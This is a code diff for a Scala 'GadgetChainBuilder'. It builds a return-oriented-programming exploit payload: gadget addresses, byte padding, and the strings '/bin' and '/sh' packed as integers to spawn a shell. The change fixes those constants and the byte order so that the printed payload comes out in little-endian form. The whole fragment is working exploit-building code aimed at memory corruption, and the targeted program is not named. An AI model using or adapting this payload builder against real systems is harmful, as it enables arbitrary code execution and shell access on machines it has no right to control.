@@ -30,8 +30,8 @@ object GadgetChainBuilder {
     chain(11) = addresses(7)      // 44
     chain(12) = addresses(0) + 56 // 48
     chain(13) = addresses(0) + 63 // 52 Points at 0 in /sh/0
-    chain(14) = 794978670         // 56 "/bin"
-    chain(15) = 796092416         // 60 "/sh/0"
+    chain(14) = 1852400175        // 56 "/bin"
+    chain(15) = 6845231           // 60 "/sh/0"
 
     for (i <- 0 until 8)
       print(s"\\x42")
@@ -39,8 +39,8 @@ object GadgetChainBuilder {
     for (gadget <- chain) {
       val hex = String.format("%08x", gadget)
 
-      for (i <- 0 until (hex.length, 2)) // todo: deal with little endianness
-        print(s"\\x${hex(i)}${hex(i + 1)}")
+      for (i <- hex.length - 1 to 0 by -2)
+        print(s"\\x${hex(i - 1)}${hex(i)}")
     }
   }
 }
